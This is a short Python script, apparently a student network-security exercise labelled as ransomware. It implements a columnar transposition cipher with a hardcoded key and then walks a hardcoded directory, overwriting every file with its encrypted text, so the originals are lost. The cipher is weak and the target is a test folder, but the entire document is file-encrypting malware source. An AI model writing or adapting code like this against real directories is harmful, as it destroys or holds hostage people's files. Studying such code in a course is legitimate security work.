import os
import base64
import math

def encrypt_msg(KEY,MSG):
    cipher = "" 
  
  
    k_indx = 0
  
    msg_len = float(len(MSG)) 
    msg_lst = list(MSG) 
    key_lst = sorted(list(KEY)) 
  
    # calculate column of the matrix 
    col = len(KEY) 
      
    # calculate maximum row of the matrix 
    row = int(math.ceil(msg_len / col)) 
  
    # add the padding character '_' in empty   
    fill_null = int((row * col) - msg_len) 
    msg_lst.extend('*' * fill_null) 
  
    # create Matrix and insert message and   
    matrix = [msg_lst[i: i + col]  
              for i in range(0, len(msg_lst), col)] 
  
    # read matrix column-wise using key 
    for _ in range(col): 
        curr_idx = KEY.index(key_lst[k_indx]) 
        cipher += ''.join([row[curr_idx]  
                          for row in matrix]) 
        k_indx += 1
  
    return cipher 



KEY = "BITS"
path = '/home/shreyas/Desktop/Sem2/ns/Ransomware/test/'

fileList = os.listdir(path)
for i in fileList:
	#if (i.endswith('.jpg') or i.endswith('.jpeg') or i.endswith('.png')):
	#	with open(os.path.join(path,i), "rb") as image_file:
        #		cipher = base64.b64encode(image_file.read())
	#else:
		f=open(os.path.join(path,i), "r")
		plaintext = f.read()

		cipher = ""
		cipher = encrypt_msg(KEY,plaintext)

		f=open(os.path.join(path,i), "w+")
		f.write(cipher)


